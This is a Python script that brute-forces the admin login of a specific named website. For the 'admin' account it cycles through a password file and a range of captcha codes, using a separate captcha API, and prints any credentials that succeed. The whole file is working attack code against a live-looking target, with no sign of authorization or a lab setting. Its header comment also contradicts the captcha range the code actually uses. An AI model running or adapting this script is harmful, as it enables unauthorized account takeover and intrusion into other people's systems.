#!/usr/bin/env python3
# chinanaisi.com captcha brute-force script
# Each password tries 0000-0499 (500 captcha codes)

import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import json
import sys
import time

CAPTCHA_URL = "https://api.myxypt.com/captcha?width=140&height=48"
LOGIN_URL = "http://chinanaisi.com/admin/login.php"
PWFILE = "/tmp/pwds.txt"
USERNAME = "admin"
CAPTCHA_RANGE = range(2000, 4000)
TIMEOUT = 6
PROGRESS_INTERVAL = 500

SUCCESS_MARKERS = ["parent.location", "top.location", "管理中心"]


def read_passwords(filepath):
    passwords = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if pw:
                    passwords.append(pw)
    except FileNotFoundError:
        print(f"[!] Password file not found: {filepath}", flush=True)
        sys.exit(1)
    return passwords


def get_captcha_uuid(opener):
    req = urllib.request.Request(CAPTCHA_URL)
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    req.add_header("Accept", "application/json, text/plain, */*")
    try:
        response = opener.open(req, timeout=TIMEOUT)
        raw_body = response.read()
        data = json.loads(raw_body.decode("utf-8", errors="ignore"))
        uuid = data.get("data", {}).get("uuid", None)
        return uuid
    except Exception as e:
        print(f"[!] Failed to get captcha UUID: {e}", flush=True)
        return None


def try_login(opener, uuid, password, captcha):
    post_data = urllib.parse.urlencode({
        "action": "loginpost",
        "uuid": uuid,
        "loginId": "",
        "username": USERNAME,
        "password": password,
        "checkcode": captcha,
    }).encode("utf-8")

    req = urllib.request.Request(LOGIN_URL, data=post_data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    req.add_header("Accept", "text/html,application/xhtml+xml,*/*")
    req.add_header("Origin", "http://chinanaisi.com")
    req.add_header("Referer", "http://chinanaisi.com/admin/login.php")

    try:
        response = opener.open(req, timeout=TIMEOUT)
        raw_body = response.read()
        try:
            body_text = raw_body.decode("gb2312", errors="ignore")
        except Exception:
            body_text = raw_body.decode("utf-8", errors="ignore")

        body_lower = body_text.lower()
        for marker in SUCCESS_MARKERS:
            if marker.lower() in body_lower:
                return True, True

        if "密码" in body_text and "验证码" not in body_text:
            return False, True

        return False, False
    except Exception:
        return False, False


def main():
    passwords = read_passwords(PWFILE)
    total_passwords = len(passwords)
    codes_per_pw = len(CAPTCHA_RANGE)
    total_attempts = total_passwords * codes_per_pw

    print(f"[*] Passwords file: {PWFILE}", flush=True)
    print(f"[*] Password count: {total_passwords}", flush=True)
    print(f"[*] Codes per password: {codes_per_pw}", flush=True)
    print(f"[*] Total attempts: {total_attempts}", flush=True)
    print(f"[*] Captcha API: {CAPTCHA_URL}", flush=True)
    print(f"[*] Login URL: {LOGIN_URL}", flush=True)
    print(f"[*] Username: {USERNAME}", flush=True)
    print(f"[*] Starting...", flush=True)
    print(flush=True)

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    attempt = 0

    for pw_idx, password in enumerate(passwords):
        uuid = get_captcha_uuid(opener)
        if uuid is None:
            print(f"[!] Skip password: {password!r}", flush=True)
            continue

        print(f"[*] PW[{pw_idx+1}/{total_passwords}]: {password} | UUID: {uuid}", flush=True)

        for code_int in CAPTCHA_RANGE:
            captcha = f"{code_int:04d}"
            attempt += 1

            success, code_ok = try_login(opener, uuid, password, captcha)

            if success:
                print(f"\n{'='*60}", flush=True)
                print(f"[!!!] LOGIN SUCCESS!!!", flush=True)
                print(f"[!!!] Password: {password}", flush=True)
                print(f"[!!!] Captcha: {captcha}", flush=True)
                print(f"[!!!] UUID: {uuid}", flush=True)
                print(f"[!!!] Attempt: {attempt}", flush=True)
                print(f"{'='*60}\n", flush=True)
                break
            elif code_ok:
                print(f"CODE_OK | password={password} | captcha={captcha} | attempt={attempt}", flush=True)
                break

            if attempt % PROGRESS_INTERVAL == 0:
                pct = (attempt / total_attempts) * 100
                print(f"[PROGRESS] {attempt}/{total_attempts} ({pct:.1f}%) | pw[{pw_idx+1}/{total_passwords}]: {password} | code: {captcha}", flush=True)
        else:
            print(f"[*] No correct captcha found for {password!r}", flush=True)

    print(f"\n[*] Done. Total attempts: {attempt}", flush=True)


if __name__ == "__main__":
    main()
